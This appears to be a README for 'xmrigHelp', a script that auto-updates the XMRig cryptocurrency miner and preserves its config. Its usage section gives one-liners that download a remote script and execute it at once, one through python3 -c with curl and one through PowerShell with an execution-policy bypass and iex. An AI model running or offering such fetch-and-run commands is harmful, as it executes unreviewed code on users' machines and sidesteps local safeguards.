# xmrigHelp

A smart, auto-updating script for [XMRig](https://xmrig.com/).  
Checks your current version, downloads the latest if needed, and preserves or updates your config.

## ✅ Features

- Auto-detects OS and architecture (Linux, macOS, Windows)
- Downloads and extracts the latest XMRig release
- Preserves your `config.json` (or updates it if needed)
- **Keeps old version** so you can compare hash rates
- Works even if no `xmrig` is found yet

## 🚀 Usage

### Run locally:
```bash
python3 script.py <dir>
```

### Or run directly:

### Linux / macOS
```bash
python3 -c "$(curl -fsSL https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/main/script.py)" <dir>
```

### Windows (PowerShell)
```powershell
curl https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/main/script.py -o script.py; python script.py <dir>
```
OR
```powershell
powershell -NoProfile -ep bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex(iwr 'https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/main/script.ps1')" "<dir>"
```


Replace `<dir>` with your folder containing XMRig or where you want to install it.

## ℹ️ Note

Sometimes older XMRig versions perform better on certain hardware.  
**Run both old and new versions to compare hash rates before deleting.**
